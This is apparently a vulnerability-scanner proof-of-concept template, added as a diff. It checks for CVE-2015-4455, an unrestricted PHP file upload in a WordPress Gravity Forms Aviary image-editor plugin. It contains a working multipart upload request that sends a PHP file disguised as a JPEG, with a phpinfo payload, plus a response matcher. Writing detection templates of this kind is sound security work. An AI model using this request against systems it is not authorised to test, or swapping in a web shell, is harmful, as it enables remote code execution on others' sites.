@@ -1,0 +1,43 @@
+[info]
+author = "AVE"
+description = "检测 WordPress Aviary Image Editor Add-On For Gravity Forms 3.0 beta 插件中 includes/upload.php 的无限制文件上传漏洞，攻击者可上传任意 PHP 文件并直接访问获取远程代码执行权限"
+id = "POC-AVE-2015-0037"
+name = "CVE-2015-4455 PoC"
+severity = "critical"
+tags = [
+    "cve-2015-4455",
+    "wordpress",
+    "file-upload",
+]
+vuln_id = [
+    "CVE-2015-4455",
+    "AVE-2015-0037",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/wp-content/plugins/aviary-image-editor-add-on-for-gravity-forms/includes/upload.php"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+------WebKitFormBoundaryAVE\r
+Content-Disposition: form-data; name="file"; filename="test.php"\r
+Content-Type: image/jpeg\r
+\r
+<?php phpinfo(); ?>\r
+------WebKitFormBoundaryAVE--"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----WebKitFormBoundaryAVE"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["test.php"]
